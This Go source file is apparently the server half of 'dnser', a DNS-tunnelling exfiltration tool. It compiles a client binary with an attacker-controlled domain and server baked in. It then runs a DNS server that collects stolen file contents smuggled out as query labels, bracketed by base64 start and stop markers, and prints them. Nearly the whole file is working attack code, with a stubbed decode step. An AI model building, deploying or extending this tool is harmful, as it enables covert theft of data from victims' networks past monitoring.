package main

import (
	"fmt"
	"os"
	"log"
	"flag"
	"errors"
	"strings"
	// "regexp"
	"strconv"
	"os/exec"
	"path/filepath"
	"gopkg.in/yaml.v3"
	"github.com/miekg/dns"
)

//Exfiltrate file
var file string
//Connection status
var connection bool
//CRC
var crc string
//domain
var domain string

type Config struct {
	Server ServerConfig `yaml:"server"`
	Client ClientConfig `yaml:"client"`
}
type ServerConfig struct {
	Port   int    `yaml:"port"`
	Host   string `yaml:"host"`
	Domain string `yaml:"domain"`
}
type ClientConfig struct {
	ProjectDir string `yaml:"projectDir"`
}

func isValidDomain(domain string) bool {
	// create normal check
	// var domainRegex = regexp.MustCompile(`^(?!-)[A-Za-z0-9-]{1,63}(?<!-)(\.[A-Za-z]{2,})+$`)
	if len(domain) < 4 || len(domain) > 253 {
		return false
	}
	return true
	// return domainRegex.MatchString(domain)
}

func buildClient(server ServerConfig, projectDir string) error {
	
	if !isValidDomain(server.Domain) {
		return errors.New("Wrong domain!")
	}

	clientSrcDir := filepath.Join(projectDir, "client_src")

	if err := os.Chdir(clientSrcDir); err != nil {
		return err
	}

	cmdTidy := exec.Command("go", "mod", "tidy")
	if _, err := cmdTidy.CombinedOutput(); err != nil {
		return err
	}

	cmdBuild := exec.Command("go", "build", fmt.Sprintf("-ldflags=-X 'main.DNSName=%s' -X 'main.nsserverhost=%s' -X 'main.nsserverport=%s'", server.Domain, server.Host, strconv.Itoa(server.Port) ),"-o","dnser_c","client.go")
	if _, err := cmdBuild.CombinedOutput(); err != nil {
		return err
	}

	fmt.Printf("The client was successfully builded.\nPath: %s\n", clientSrcDir+"/dnser_c")
	return nil
}

func done() bool {
	//check src

	//decode from base64

	//printfile
	fmt.Println(file)
	file = ""
	return true
}

func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {

	// Log the received query
	for _, question := range r.Question {
		if strings.Contains(question.Name, ".ZG5zZXJjX3N0YXJ0X21lc3NhZ2Ug."){
			connection = true
			crc = strings.Split(question.Name, ".")[0]
		} else {
			if connection {
				if strings.Contains(question.Name, "ZG5zZXJjX3N0b3BfbWVzc2FnZSAg.") {
					connection = false
					done()
				} else {
					data := strings.Split(question.Name[:len(question.Name)-len(domain)-1], ".")
					for i := len(data) -1; i >= 0; i-- {
						file += data[i]
					}
				}
			}
		}
		// log.Printf("Received query for: %s", question.Name)
	}


	//TODO: resend request
	// Create a response
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = false // Disable compression for simplicity

	// Respond with an empty answer
	w.WriteMsg(m)
}

func main() {
	banner := `    __
.--|  |.-----..-----..-----..----.
|  _  ||     ||__ --||  -__||   _|
|_____||__|__||_____||_____||__| 
 server v1.0

 by: fedoik
 Repo: https://github.com/fedoik/dnser/tree/main
 Try for help: server -h
`

	fmt.Println(banner)

	configPath := flag.String("config", "./test_config.yaml", "Path to the configuration file (required)")
	build := flag.Bool("build", false, "Build the client (optional)")
	serve := flag.Bool("serve", false, "Server start (optional)")
	flag.Parse()

	// Init config
	file, err := os.Open(*configPath)
	if err != nil {
		log.Fatalf("[X]Error opening file: %v", err)
	}
	defer file.Close()

	var config Config
	decoder := yaml.NewDecoder(file)
	if err := decoder.Decode(&config); err != nil {
		log.Fatalf("[X]Error decoding YAML: %v", err)
	}
	// arg for build client
	// from config and from cli

	if *build {
		err = buildClient(config.Server, config.Client.ProjectDir)
		if err != nil {
			log.Fatalf("[X] Client build error: %v", err)
		}
	}

	if *serve {
		domain = config.Server.Domain

		dns.HandleFunc(".", handleDNSRequest) // Handle all queries

		server := &dns.Server{Addr: fmt.Sprintf(":%d", config.Server.Port), Net: "udp"}

		log.Printf("[+]Starting DNS server on port %d...", config.Server.Port)
		if err := server.ListenAndServe(); err != nil {
			log.Fatalf("[X]Failed to start server: %s\n", err.Error())
		}
	}

}
